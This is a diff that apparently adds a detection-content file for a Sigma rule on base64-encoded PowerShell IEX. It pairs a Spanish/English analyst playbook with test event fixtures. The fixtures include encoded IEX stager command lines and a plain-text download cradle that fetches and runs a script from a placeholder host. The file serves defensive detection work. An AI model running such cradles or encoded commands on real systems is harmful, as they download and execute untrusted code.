@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "88f680b8-070e-402c-ae11-d2914f2257f1",
+    "title": "PowerShell Base64 Encoded IEX Cmdlet",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_base64_iex.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_base64_iex.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso cuya línea de comandos contiene el cmdlet IEX (Invoke-Expression) codificado en base64, en ASCII o en UTF-16LE. Suele indicar ejecución ofuscada de código PowerShell, a menudo un stager de descarga.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde CommandLine contiene variantes en base64 de 'IEX (New', 'IEX ([' o \"IEX(('\" en cualquier offset, o en UTF-16LE (formato de -EncodedCommand), sin distinguir mayúsculas.",
+      "why_it_matters": "IEX ejecuta texto como código. Si además se codifica en base64, alguien quiso ocultar ese código a la revisión y a los controles por firma. Es un patrón habitual en droppers y frameworks de post-explotación (ATT&CK T1059.001, PowerShell).",
+      "triage_steps": [
+        "Decodifique el base64 de CommandLine (UTF-16LE si es -EncodedCommand o -enc) y anote las URL, IP, rutas o cadenas FromBase64String/Reflection que aparezcan.",
+        "Revise ParentImage y la línea de comandos del padre: Office, wscript, mshta, WmiPrvSE o un servicio como padre resultan muy sospechosos.",
+        "Confirme el User y si es una cuenta interactiva, de servicio o SYSTEM, y si ese usuario suele ejecutar PowerShell en ese equipo.",
+        "Busque procesos hijos, conexiones de red, consultas DNS y archivos creados en el mismo host entre 15 minutos antes y 15 minutos después.",
+        "Si existe Script Block Logging (evento 4104), recupere el script desofuscado que realmente se ejecutó.",
+        "Busque la misma cadena codificada o el mismo dominio en otros endpoints, y revise alertas previas del mismo host y usuario."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; trate cada alerta como sospechosa hasta que la verifique.",
+        "Scripts de administración, despliegue o RMM que se distribuyen codificados para evitar problemas al escapar comillas.",
+        "Pruebas autorizadas de red team o de simulación de adversarios; valídelas con el equipo responsable."
+      ],
+      "response_steps": [
+        "Cuando el contenido decodificado confirme actividad maliciosa, aísle el endpoint desde el EDR y conserve la memoria y los logs de PowerShell.",
+        "Bloquee en el proxy y el firewall los dominios, las URL y las IP extraídas del payload, y busque otros hosts que los hayan contactado.",
+        "Elimine la persistencia asociada (tareas programadas, claves Run, WMI) después de documentarla, y restablezca las credenciales del usuario afectado.",
+        "Restaure el equipo desde una imagen limpia si hubo ejecución confirmada, y evalúe aplicar Constrained Language Mode o AMSI estricto."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque codificar IEX en base64 es poco común en uso legítimo y muy característico de la ejecución ofuscada de código descargado."
+    },
+    "en": {
+      "summary": "A process was started whose command line contains the IEX (Invoke-Expression) cmdlet encoded in base64, either ASCII or UTF-16LE. This usually means obfuscated PowerShell execution, often a download stager.",
+      "what_it_detects": "Windows process creation events where CommandLine contains base64 forms of 'IEX (New', 'IEX ([' or \"IEX(('\" at any offset, or in UTF-16LE (the -EncodedCommand format). Matching is case-insensitive.",
+      "why_it_matters": "IEX runs text as code. Base64-encoding it means someone wanted to hide that code from review and from signature-based controls. Droppers and post-exploitation frameworks commonly do this (ATT&CK T1059.001, PowerShell).",
+      "triage_steps": [
+        "Decode the base64 in CommandLine (as UTF-16LE for -EncodedCommand/-enc). Note any URLs, IPs, paths, FromBase64String or Reflection calls.",
+        "Review ParentImage and the parent's command line. Office apps, wscript, mshta, WmiPrvSE or a service as the parent are highly suspicious.",
+        "Check the User: is it interactive, a service account or SYSTEM? Does this user normally run PowerShell on this host?",
+        "Pivot on the same host within +/- 15 minutes for child processes, network connections, DNS queries and dropped files.",
+        "If Script Block Logging (event 4104) is available, retrieve the deobfuscated script that actually ran.",
+        "Hunt for the same encoded string or domain on other endpoints. Review earlier alerts for this host and user."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives, so treat each hit as suspicious until you verify it.",
+        "Admin, deployment or RMM scripts shipped encoded to avoid quote-escaping problems.",
+        "Authorized red team or adversary emulation exercises. Confirm them with the owning team."
+      ],
+      "response_steps": [
+        "If the decoded content confirms malicious activity, isolate the endpoint through EDR and preserve memory and PowerShell logs.",
+        "Block the domains, URLs and IPs taken from the payload at the proxy and firewall, then look for other hosts that contacted them.",
+        "Document and then remove any related persistence (scheduled tasks, Run keys, WMI). Reset the affected user's credentials.",
+        "If execution is confirmed, reimage from a clean baseline. Consider enforcing Constrained Language Mode or stricter AMSI policies."
+      ],
+      "severity_rationale": "High fits because base64-encoding IEX is rare in legitimate use and is a strong sign of obfuscated execution of downloaded code."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell -EncodedCommand with UTF-16LE base64 of 'IEX (New-Object Net.WebClient)', launched from Word",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+          "ProcessId": 6120,
+          "ParentProcessId": 4388,
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "ASCII base64 of 'IEX (New-Object Net.WebClient)' decoded inline through FromBase64String",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command \"$s=[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp'))\"",
+          "ProcessId": 7344,
+          "ParentProcessId": 7012,
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Benign -EncodedCommand containing UTF-16LE base64 of 'Get-Date' from an admin script",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBEAGEAdABlAA==",
+          "ProcessId": 2216,
+          "ParentProcessId": 980,
+          "IntegrityLevel": "System"
+        }
+      },
+      {
+        "description": "Plain-text IEX download cradle, not base64-encoded, so this rule does not match",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://tools.example.com/setup.ps1')\"",
+          "ProcessId": 5530,
+          "ParentProcessId": 3104,
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
